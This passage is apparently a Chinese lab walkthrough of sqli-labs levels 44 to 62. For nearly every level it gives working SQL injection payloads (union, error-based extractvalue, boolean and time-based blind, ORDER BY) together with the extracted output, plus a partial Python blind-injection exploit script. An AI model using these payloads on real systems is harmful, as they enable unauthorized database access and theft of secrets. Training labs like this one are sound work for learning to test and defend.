class="code">                    asciiValue[k] = '0'</span></span><br><span class="line"><span class="code">                    continue</span></span><br><span class="line"></span><br><span class="line"><span class="code">        foo = int(asciiValue[0] + asciiValue[1] + asciiValue[2])# 如'4'+'9' =&gt; 49, '10'+'2'=102</span></span><br><span class="line"><span class="code">        flag += chr(foo)    #chr(49)='1'</span></span><br><span class="line"><span class="code">        print("[-]current content is:&#123;&#125;".format(flag))</span></span><br><span class="line"><span class="code">    if flag != '':</span></span><br><span class="line"><span class="code">        return flag</span></span><br><span class="line"><span class="code">    else:</span></span><br><span class="line"><span class="code">        print("[!]req2getOneChar ERROR!")</span></span><br><span class="line"></span><br><span class="line"><span class="section"># step 1：获取表名</span></span><br><span class="line"></span><br><span class="line">def getTables(): # P79FGLN0JK</span><br><span class="line">payload = '''(select group<span class="emphasis">_concat(table_</span>name) from information<span class="emphasis">_schema.tables where table_</span>schema=0x6368616c6c656e676573)'''</span><br><span class="line">table<span class="emphasis">_name = req2getOneChar(xurl=url, payload=payload, start=1, end=table_</span>name_len)</span><br><span class="line">print("[-]table<span class="emphasis">_name is:&#123;&#125;".format(table_</span>name))</span><br><span class="line">return table_name</span><br><span class="line"></span><br><span class="line">def getColumn():</span><br><span class="line">'''</span><br><span class="line">获取列名，</span><br><span class="line">--------------------------</span><br><span class="line">内容 id,sessid,secret_Y1P6,tryy</span><br><span class="line">↑ ↑</span><br><span class="line">位置 11 21</span><br><span class="line">--------------------------</span><br><span class="line">''' # step 2：获取列名</span><br><span class="line">payload = '''(select group<span class="emphasis">_concat(column_</span>name) from information<span class="emphasis">_schema.columns where table_</span>schema=0x6368616c6c656e676573 and table<span class="emphasis">_name=&#123;table&#125;)'''.format(table=str_</span>to<span class="emphasis">_hex(table_</span>name))</span><br><span class="line">column_name = req2getOneChar(xurl=url, payload=payload, start=11, end=21)</span><br><span class="line"></span><br><span class="line"><span class="code">    if "secret" in column_name:</span></span><br><span class="line"><span class="code">        print("[+]column_name is:&#123;&#125;".format(column_name))</span></span><br><span class="line"><span class="code">        return column_name</span></span><br><span class="line"><span class="code">    else:</span></span><br><span class="line"><span class="code">        print("step2 失败！")</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 清空次数</span></span><br><span class="line"></span><br><span class="line">sess.get(url=reset_url, verify=VERIFY)</span><br><span class="line"></span><br><span class="line"><span class="section"># exploit</span></span><br><span class="line"></span><br><span class="line">table_name = getTables()</span><br><span class="line">column_name = getColumn()</span><br><span class="line"></span><br><span class="line"><span class="section"># step 3 获取 flag</span></span><br><span class="line"></span><br><span class="line">payload = '''(select &#123;&#125; from &#123;&#125;)'''.format((column<span class="emphasis">_name), (table_</span>name))</span><br><span class="line">flag = req2getOneChar(xurl=url, payload=payload, start=1, end=flag_len)</span><br><span class="line">print("[+]FLAG is:&#123;&#125;".format(flag))</span><br></pre></td></tr></table></figure>

<h1 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h1><p>boolean injection, close char is <code>&#39;)</code>, via <code>/Less-62/?id=1&#39;) and 1=2 -- -</code>and<code>/Less-62/?id=1&#39;) and 1=1 -- -</code><br>参考脚本<a href="https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py" target="_blank" rel="noopener">https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py</a><br>运行效果如图, 舒服<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594111563293-dccec4bc-b117-4c14-af8b-ab095114a2ea.png#align=left&display=inline&height=250&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=500&originWidth=667&size=77407&status=done&style=none&width=333.5" alt="图片.png"></p>
<h1 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h1><p>close_chars is <code>&#39;))</code> , can be mounted via <code>/Less-61/?id=1&#39;)) and 1=2 -- -</code><br>so adjust my exploit script, get the flag…</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+]table_name is:UX9CUK2CIC</span><br><span class="line">[+]column<span class="emphasis">_name is:secret_</span>9BN9</span><br><span class="line">[+]flag is:l55fc3v4TvJZk7GAspprtOAh</span><br></pre></td></tr></table></figure>

<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593922201970-9c162cca-f873-4380-8399-faa205c778f2.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=clr.png&originHeight=596&originWidth=958&size=65344&status=done&style=none&width=479" alt="clr.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\$ /root/TODO/sqli-lab/blind-sqli/venv/error<span class="emphasis">_based_</span>exp.py</span><br><span class="line">[+]table_name is:OTTEP9Q92I</span><br><span class="line">[+]column<span class="emphasis">_name is:secret_</span>GRH1</span><br><span class="line">[+]flag is:mcnTThCOxqzeD2ok8CJgKjfn</span><br></pre></td></tr></table></figure>

<h1 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h1><p>闭合符号是<code>&quot;)</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|3BYH4G78SZ|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x3342594834473738535a),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|id,sessid,secret_Y1P6,tryy|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select secret_Y1P6 from 3BYH4G78SZ),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|uwpeCvsrLcadsa8P7wSn9Ix4|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h1><blockquote>
<p>Less than 5 attempts</p>
</blockquote>
<p>报错注入，整数型注入点，无须加闭合符号</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-59/index.php?id=1 and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|MDAMM2TQC0|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-59/index.php?id=1|| extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x4d44414d4d3254514330),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|id,sessid,secret_8OOF,tryy|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-59/index.php?id=1 ||extractvalue(rand(),concat(0x7c,(select secret_8OOF from MDAMM2TQC0),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|CoyCW2IfA9AcJ0hkK2qLNC9v|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h1><p>报错注入，加单引号可闭合</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-58/index.php?id=2' or extractvalue(rand(),concat(0x7c,(version()),0x7c) )-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|BOE8SLA8JQ|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x424f4538534c41384a51),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|id,sessid,secret_FQB6,tryy|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select secret_FQB6 from BOE8SLA8JQ),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|B0vjwa55UVF1zg6dk82s5YB7|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h1><p>闭合符号是<code>&quot;</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-57/index.php?id=0" union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:ABM2UNYI3Q</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-57/index.php?id=0" union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x41424d32554e59493351-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:id,sessid,secret_6DIE,tryy</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-57/index.php?id=0" union select 11,22,group_concat(secret_6DIE) from ABM2UNYI3Q-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:tZu9ubeDFgkGhooKCpNZcxwI</span><br></pre></td></tr></table></figure>

<h1 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h1><blockquote>
<p>14 次之内出结果</p>
</blockquote>
<p>闭合符号是<code>&#39;)</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-56/index.php?id=0') union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:EBO6LSIRQE</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-56/index.php?id=0') union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x45424f364c5349525145-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:id,sessid,secret_4UZO,tryy</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-56/index.php?id=0') union select 11,22,group_concat(secret_4UZO) from EBO6LSIRQE-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:8amWDI2U8nxTFu6BqEDF7WlM</span><br></pre></td></tr></table></figure>

<h1 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h1><blockquote>
<p>要求 14 次之内出结果</p>
</blockquote>
<p>由<code>/Less-55/?id=2-1</code>知是整数型的注入点</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-55/index.php?id=0) union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:Q5X3TPYWK7</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-55/index.php?id=0) union select 11,22,group_concat(column_name) from information_schema.columns where table_name=0x59414e52364d46534453 and table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:id,sessid,secret_IIJI,tryy</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-55/index.php?id=0) union select 11,22,secret_IIJI from Q5X3TPYWK7 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:yTWvRRHETnXIo38rWajAOFb4</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593697751110-7b819b16-056e-4f55-ac7e-539b3631c15e.png#align=left&display=inline&height=316&margin=%5Bobject%20Object%5D&name=image.png&originHeight=632&originWidth=1485&size=493680&status=done&style=none&width=742.5" alt="image.png"></p>
<h1 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h1><blockquote>
<p>The objective of this challenge is to dump the <strong>(secret key)</strong> from only random table from Database <strong><em>(‘CHALLENGES’)</em></strong> in Less than 10 attempts<br>For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</p>
</blockquote>
<p>这关的目标，是从一个叫<code>CHALLENGES</code>的数据库中找到 flag，只有 10 次请求的机会，十次之后必须重置——表名、列名都会因此发生变化（随机值）。<br>联合注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-54/?id=0' union select 11,22,33 -- -</span><br></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//列出数据库名</span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line">//列出表名</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-54/index.php?id=0' union select 11,22,group_concat(TABLE_name) from information_schema.tables%20 where table_schema=0x6368616c6c656e676573-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:N9K0T2B5HK</span><br><span class="line"></span><br><span class="line">//列名</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-54/index.php?id=0' union select 11,22,group_concat(column_name) from information_schema.columns%20</span></span><br><span class="line"></span><br><span class="line"><span class="code">    where table_schema=0x6368616c6c656e676573</span></span><br><span class="line"></span><br><span class="line">and table_name=0x4e394b3054324235484b-- -</span><br><span class="line">Your Password:id,sessid,secret_ZRYE,tryy</span><br><span class="line"></span><br><span class="line">//flag</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-54/index.php?id=0' union select 11,22,secret_ZRYE from%20 N9K0T2B5HK-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:zbEMB0vRz6OS2aawzyvIiT5l</span><br></pre></td></tr></table></figure>

<p>过关！<br>中间还复习了以下 information_schema 表的结构</p>
<p>reference</p>
<ul>
<li><a href="https://blog.csdn.net/qq_37133717/article/details/93498444" target="_blank" rel="noopener">https://blog.csdn.net/qq_37133717/article/details/93498444</a></li>
</ul>
<h1 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h1><p>闭合符号是单引号，无错误回显，那么就直接上盲注的 payload</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-53/?sort=1',if(1=1,id,username)-- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h1><p>无需闭合，直接上盲注的 payload，<code>case when then else end</code>和<code>if</code>都可以，只是我个人比较喜欢<code>if</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-52/?sort=if(left(version(),2)='5',username ,exp(999))</span></span><br><span class="line"></span><br><span class="line">【false】 页面无结果回显</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-52/?sort=if(left(version(),1)='5',username ,exp(999))</span></span><br><span class="line"></span><br><span class="line">【true】 页面有回显</span><br></pre></td></tr></table></figure>

<p>根据页面回显的不同，就可以一位一位地跑出数据</p>
<h1 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h1><p>跟上一关类似，只是前后需要闭合：前面需要单引号闭合，后面可以用注释也可以双目符+单引号闭合（如<code>and &#39;</code>)<br>报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-51/?sort=2',extractvalue(rand(),concat(0x7c,version(),0x7c)) -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<p>盲注是一样的</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-51/?sort=0',if(left(version(),1)='5', username,id) -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-50-ORDER-BY-Clause-Blind-based"><a href="#Less-50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-50 - ORDER BY Clause Blind based"></a>Less-50 - ORDER BY Clause Blind based</h1><p>无需闭合符号且有报错，可以由<code>/Less-50/?sort=2,0</code>和<code>/Less-50/?sort=2,1</code>回显不同来确定有注入点<br>通过报错注入拿到信息</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-50/?sort=2,extractvalue(rand(),concat(0x7c,version(),0x7c))</span><br></pre></td></tr></table></figure>

<p>布尔盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-50/?sort=if(1=1, username,id)</span><br><span class="line">/Less-50/?sort=if(1=2, username,id)</span><br><span class="line"></span><br><span class="line"><span class="section"># exp</span></span><br><span class="line"></span><br><span class="line">/Less-50/?sort=if(left(version(),1)='5', username,id)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="Less-49-ORDER-BY-Clause-Blind-based"><a href="#Less-49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-49 - ORDER BY Clause Blind based"></a>Less-49 - ORDER BY Clause Blind based</h1><p>order by 要跑盲注，不但要检查是否需单引号来闭合语句，还需要记得<strong>加逗号</strong>！</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-49/?sort=',USERNAME -- -</span><br><span class="line">/Less-49/?sort=1',IF(1=1,<span class="code">`username`</span>,0) -- -</span><br><span class="line"></span><br><span class="line"><span class="section">## 下面两种顺序不同</span></span><br><span class="line"></span><br><span class="line">/Less-49/?sort=1',IF(length(version())&gt;119,<span class="code">`username`</span>,0) -- -</span><br><span class="line">/Less-49/?sort=1',IF(length(version())&gt;9,<span class="code">`username`</span>,0) -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># exp</span></span><br><span class="line"></span><br><span class="line">/Less-49/?sort=1',IF(length(version())=23,<span class="code">`username`</span>,0) -- -</span><br><span class="line">/Less-49/?sort=1',IF(left(version(),1)='5',<span class="code">`username`</span>,0) -- -</span><br><span class="line">/Less-49/?sort=1',IF(left(version(),2)='5.',<span class="code">`username`</span>,0) -- -</span><br><span class="line">...</span><br><span class="line">/Less-49/?sort=1',IF(left(version(),23)='5.7.30-0ubuntu0.18.04.1',<span class="code">`username`</span>,0) -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h1><p>布尔盲注 poc</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-48/?sort=1,0</span></span><br><span class="line"></span><br><span class="line">无回显</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-48/?sort=1,1</span></span><br><span class="line"></span><br><span class="line">有回显</span><br></pre></td></tr></table></figure>

<p>EXP 使用<code>case when [query] then [1] else [2] end</code> 或者<code>IF([query], [1], [2])</code>均可</p>
<ul>
<li>注意<code>[1] [2]</code>位置<strong>不能填数字</strong>，带上反引号也不行。只能填字符串，如<code>test</code></li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># exp 跑数据</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-48/?sort=if(length(version())&gt;99,username,1)</span></span><br><span class="line"></span><br><span class="line">顺序为 8 9 10</span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-48/?sort=if(length(version())&gt;1,username,1)</span></span><br><span class="line"></span><br><span class="line">顺序为 1-9 的增序</span><br></pre></td></tr></table></figure>

<p>利用<code>[query]</code>语句为真/假时的响应顺序不同，就能一位一位跑出数据</p>
<h1 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h1><p><code>order by 1</code>与<code>order by &#39;1&#39;</code>是不同的，也就是不能用单引号。但反引号```是可以的（不区分大小写）<br>加单引号报错，想必闭合符号就是单引号，用双目运算符来闭合</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-47/?sort=' and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ||'</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '||5.7.30-0ubuntu0.18.04.1||'</span><br></pre></td></tr></table></figure>

<h1 id="Less-46-ORDER-BY-Error-Numeric"><a href="#Less-46-ORDER-BY-Error-Numeric" class="headerlink" title="Less-46 - ORDER BY-Error-Numeric"></a>Less-46 - ORDER BY-Error-Numeric</h1><p>order by 后面的注入，特点如下</p>
<ul>
<li>无法作运算，即<code>sort=2</code>与<code>sort=(3-1)</code>不同</li>
<li>如果直接<code>if(1=2,1,SLEEP(2))</code>，sleep 时间将会变成 2*当前表中记录的数目，<strong>将会对服务器造成一定的拒绝服务攻击，</strong>建议采用子语句验证延时注入，例如<code>if(1=2,1,(select 1 from (select SLEEP(2))x))</code></li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 以下结果不同</span></span><br><span class="line"></span><br><span class="line"><span class="code">    rand(1=2)</span></span><br><span class="line"><span class="code">    rand(1=1)</span></span><br></pre></td></tr></table></figure>

<p>访问<code>/Less-46/?sort=1,0</code>发现蹊跷，加单引号发现回显中有错误信息<br>用<code>/Less-46/?sort=3-- -</code>确定注入点是数字型，不需要另外加闭合符号<br><strong>报错注入</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-46/?sort=extractvalue(rand(),concat(0x7c,version(),0x7c))--+-</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<p><strong>盲注</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># boolean injection poc</span></span><br><span class="line"></span><br><span class="line"><span class="section"># delay injection poc</span></span><br><span class="line"></span><br><span class="line">/Less-46/?sort=select 1 from (select sleep(5))x-- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-45-Stacked-Query-Blind-based-twist"><a href="#Less-45-Stacked-Query-Blind-based-twist" class="headerlink" title="Less-45 - Stacked Query Blind based twist"></a>Less-45 - Stacked Query Blind based twist</h1><p>布尔盲注，根据页面会显信息的不同来跑数据</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=adm') or 11=11 -- -&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line"><span class="code">    【true】状态码是302，跳转到主页</span></span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=adm') or 11=00 -- -&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line"><span class="code">    【false】状态码是200，且含有slap1.jpg，即源码中有&lt;img src="../images/slap1.jpg"&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h1><p>页面无报错信息，只有两种状态回显，poc 如下</p>
